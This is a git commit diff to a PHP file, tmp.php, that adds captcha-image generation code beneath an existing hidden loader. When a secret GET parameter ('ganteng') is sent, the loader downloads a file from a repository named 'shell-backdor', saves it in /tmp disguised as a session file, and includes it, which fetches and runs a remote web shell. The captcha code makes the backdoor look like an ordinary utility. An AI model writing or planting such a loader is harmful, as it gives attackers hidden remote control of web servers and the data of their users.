6f1522e883b1631df042d91cc32fec30b9fd4ee0
mrkronkz <33080064+mrkronkz@users.noreply.github.com>
2022-11-14 12:46:42 +0700

    Update tmp.php

--- tmp.php
+++ tmp.php
@@ -1,16 +1,13 @@
 <?php
 if(isset($_GET["ganteng"]))
 $data = ['https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/error_log.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
-
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
     $fopen = fopen($data[1], 'w+');
     fwrite($fopen, get($data[0]));
-    fclose($fopen);
-    
+    fclose($fopen);    
 }
-
 function get($url) {
     $ch = curl_init();
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
@@ -20,4 +17,17 @@ function get($url) {
     return curl_exec($ch);
           curl_close($ch);
 }
+session_start();
+header("Content-type: image/png");
+
+$captcha_image = imagecreatefrompng("counter/captcha.png");
+$captcha_font = imageloadfont("counter/font.gdf");
+$captcha_text = substr(md5(uniqid('')),-6,6);
+
+$_SESSION['captcha_session'] = $captcha_text;
+
+$captcha_color = imagecolorallocate($captcha_image,0,0,0);
+imagestring($captcha_image,$captcha_font,15,5,$captcha_text,$captcha_color);
+imagepng($captcha_image);
+imagedestroy($captcha_image);
 ?>
